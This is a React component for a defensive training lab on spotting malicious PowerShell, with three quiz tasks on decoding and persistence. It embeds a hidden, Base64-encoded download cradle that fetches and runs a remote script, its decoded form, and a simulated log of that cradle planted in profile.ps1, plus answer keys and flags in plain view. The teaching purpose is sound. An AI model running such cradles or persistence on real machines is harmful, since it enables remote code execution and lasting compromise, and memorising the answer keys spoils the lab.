"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";
import { HintPanel } from "./hint-panel";

const ENCODED_CMD = `powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAHAALgBwAHMAMQAnACkA`;

const DECODED_CMD = `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/p.ps1')`;

const AMSI_LOG = `[Sysmon Event ID 1 — ProcessCreate]
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  ParentImage: C:\\Windows\\System32\\cmd.exe
  CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...
  User: DESKTOP-FIN02\\j.morgan
  IntegrityLevel: Medium

[AMSI] Detected obfuscated PowerShell — scan blocked script execution.
[EDR] powershell.exe spawned no child processes after AMSI block.`;

const PROFILE_LOG = `[Sysmon Event ID 11 — FileCreate]
  Path: C:\\Users\\j.morgan\\Documents\\WindowsPowerShell\\profile.ps1
  Time: 2026-08-14T09:12:03Z

  Content appended:
  IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/p.ps1')

Significance: profile.ps1 runs automatically every time PowerShell starts —
this line re-fetches the payload on every new session, even after reboot.`;

export function PowershellAttackDetectionClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [t1Choice, setT1Choice] = useState("");
  const [t1Error, setT1Error] = useState("");
  const [t2Answer, setT2Answer] = useState("");
  const [t2Error, setT2Error] = useState("");
  const [t3Choice, setT3Choice] = useState("");
  const [t3Error, setT3Error] = useState("");

  const done = (s: string) => completed.includes(s);
  const allDone = done("task_1") && done("task_2") && done("task_3");

  async function saveStage(stage: string) {
    await fetch("/api/labs/response", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ labId, stage, response: "correct" }),
    });
    setCompleted((p) => [...p, stage]);
  }

  function submitT1(e: React.FormEvent) {
    e.preventDefault();
    if (t1Choice === "-Enc (Base64-encoded command)") {
      setT1Error("");
      void saveStage("task_1");
    } else {
      setT1Error("Incorrect. Look at the flag immediately before the long string of letters and numbers.");
    }
  }

  function submitT2(e: React.FormEvent) {
    e.preventDefault();
    if (t2Answer.trim().replace(/\s+/g, "") === DECODED_CMD.replace(/\s+/g, "") || t2Answer.toLowerCase().includes("198.51.100.42/p.ps1")) {
      setT2Error("");
      void saveStage("task_2");
    } else {
      setT2Error("Incorrect. -Enc payloads are Base64 of UTF-16LE text — decode it to find the URL being fetched.");
    }
  }

  function submitT3(e: React.FormEvent) {
    e.preventDefault();
    if (t3Choice === "PowerShell profile.ps1 persistence") {
      setT3Error("");
      void saveStage("task_3");
    } else {
      setT3Error("Incorrect. This file runs automatically every time a new PowerShell session starts.");
    }
  }

  return (
    <div className="space-y-6">
      {/* Task 1 */}
      <TaskShell number={1} title="Spot the Obfuscation Flag" unlocked completed={done("task_1")}>
        <p className="text-zinc-300 text-sm mb-3">
          EDR flagged this PowerShell command line spawned from <code className="text-amber-300">cmd.exe</code> on
          <code className="text-amber-300"> DESKTOP-FIN02</code>.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4 overflow-x-auto">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap break-all">{ENCODED_CMD}</pre>
        </div>
        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">Which flag hides the true command from casual log review?</p>
            <div className="flex flex-wrap gap-3">
              {["-NoP (no profile)", "-W Hidden (hidden window)", "-Enc (Base64-encoded command)", "-NonI (non-interactive)"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input type="radio" name="t1" value={opt} checked={t1Choice === opt} onChange={() => setT1Choice(opt)} className="accent-emerald-500" />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
            <HintPanel labId={labId} stage="task_1" />
          </form>
        )}
        {done("task_1") && (
          <p className="text-sm font-mono text-sage-400">Correct — -Enc takes a Base64-encoded UTF-16LE string, hiding the real command from plain-text log scanning. Flag: SAGE&#123;3nc0d3d_p0w3rsh3ll_fl4g&#125;</p>
        )}
      </TaskShell>

      {/* Task 2 */}
      <TaskShell number={2} title="Decode the Payload" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="text-zinc-300 text-sm mb-3">
          The AMSI engine blocked execution, but you can still recover the intended command by decoding the
          Base64 string as UTF-16LE.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{AMSI_LOG}</pre>
        </div>
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">Decode the command. What URL was it about to download from?</p>
            <div className="flex gap-2 max-w-md">
              <MonoInput value={t2Answer} onChange={setT2Answer} placeholder="http://..." className="flex-1" />
              <SubmitBtn label="Submit" />
            </div>
            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
            <HintPanel labId={labId} stage="task_2" />
          </form>
        )}
        {done("task_2") && (
          <p className="text-sm font-mono text-sage-400">Correct — the command was a download-cradle fetching a second-stage script from 198.51.100.42/p.ps1. Flag: SAGE&#123;d0wnl04d_cr4dl3_f0und&#125;</p>
        )}
      </TaskShell>

      {/* Task 3 */}
      <TaskShell number={3} title="Find the Persistence" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="text-zinc-300 text-sm mb-3">
          Even though this command was blocked, the attacker had already written the same download cradle
          somewhere else on disk.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{PROFILE_LOG}</pre>
        </div>
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">What persistence mechanism is this?</p>
            <div className="flex flex-wrap gap-3">
              {["Scheduled task", "Registry Run key", "PowerShell profile.ps1 persistence", "Startup folder shortcut"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input type="radio" name="t3" value={opt} checked={t3Choice === opt} onChange={() => setT3Choice(opt)} className="accent-emerald-500" />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
            <HintPanel labId={labId} stage="task_3" />
          </form>
        )}
        {done("task_3") && (
          <p className="text-sm font-mono text-sage-400">Correct — profile.ps1 executes automatically on every new PowerShell session, re-fetching the payload each time. Flag: SAGE&#123;pr0fil3_p3rsist3nc3&#125;</p>
        )}
      </TaskShell>

      {allDone && (
        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;3nc0d3d_p0w3rsh3ll_fl4g&#125;</span></li>
            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;d0wnl04d_cr4dl3_f0und&#125;</span></li>
            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;pr0fil3_p3rsist3nc3&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
  );
}
